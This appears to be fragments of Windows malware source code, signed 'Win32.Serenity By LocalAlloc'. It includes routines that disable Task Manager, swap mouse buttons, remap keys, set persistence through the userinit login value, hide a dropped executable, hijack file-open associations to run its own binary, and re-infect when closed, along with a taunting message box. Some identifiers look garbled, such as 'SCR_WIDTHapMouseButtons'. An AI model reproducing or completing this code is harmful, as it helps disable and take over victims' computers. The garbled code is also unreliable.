...
bool IsFirstRun()
{
	...
	if (GetFileAttributesA("C:\\Windows\\System32\\winnt32.exe") == INVALID_FILE_ATTRIBUTES)
	{
...
void taskmgr() {
	...
	RegSetValueExW(hKey, L"DisableTaskmgr", 0, REG_DWORD, (LPBYTE)&dwVal, sizeof(DWORD));
	RegCloseKey(hKey);
}
void scancodemap() {
	HKEY hKey;
...
void swapmousebuttons() {
	...
	RegSetValueEx(hKey, L"SCR_WIDTHapMouseButtons", 0, REG_DWORD, (LPBYTE)&dwVal, sizeof(DWORD));
	RegCloseKey(hKey);
}
void wallpaper() {
...
void launch() {
	if (Is64BitWindows()) {
		const char* exe = "C:\\Windows\\system32\\userinit.exe,C:\\Windows\\SySCR_WIDTHOW64\\Mercury.exe";
		SetValue(exe);
	}
	else {
...
void all() {
	...
	SetFileAttributes(L"C:\\Windows\\System32\\winnt32.exe", FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
...
void WHOAMI() {
	MessageBoxW(NULL, L"I'm your haunting dream, in shadows I gleam. I'm your eyes, secrets I redeem. I'm your pain, an endless stream. Sad but true, in darkness we teem. I'm your dream, astray it seems. I'm your eyes, lost in moonbeam. I'm your pain, a relentless theme. You know it's sad but true, life's extreme.\n\n-Win32.Serenity By LocalAlloc-", L"Forlorn", MB_ICONERROR);
}
...
void infect() {
	const char* exe = """C:\\Windows\\System32\\serenity.exe \"%1\" %*""";
	HKEY hkey;
...
void simulateKeyPress1(WORD key1, WORD key2)
{
	INPUT input[2];
...
DWORD WINAPI watch(LPVOID parameter) {
	...
	{
		//MessageBoxA(NULL, "You Dare Close Me!", "", MB_OK | MB_ICONERROR);
		infect();
